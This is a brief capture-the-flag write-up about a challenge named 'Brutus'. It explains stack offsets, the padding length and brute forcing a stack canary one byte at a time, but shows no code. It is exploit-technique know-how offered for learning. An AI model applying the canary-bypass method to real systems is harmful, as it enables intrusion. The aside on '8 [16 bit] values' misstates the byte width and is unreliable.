CTFd —  Brutus (part 3 - brute forcing canary)

So we know how the program is working over socket, we can connect to it. Now we need to look at the program and define our oracle.

Now the input is being stored at RBP - 0x90 offset

The canary is is at RBP - 0x8

That means the padding needs to be 0x90 - 0x8 = 0x88 or 136 bytes

Wrote a script to brute force the canary byte by byte locally :

Note: Canary can be brute forced byte by byte which significantly reduces the amount of combinations one needs to try. Brute forcing 8 [16 bit] values is far less work than brute forcing 1 [64 bit] value
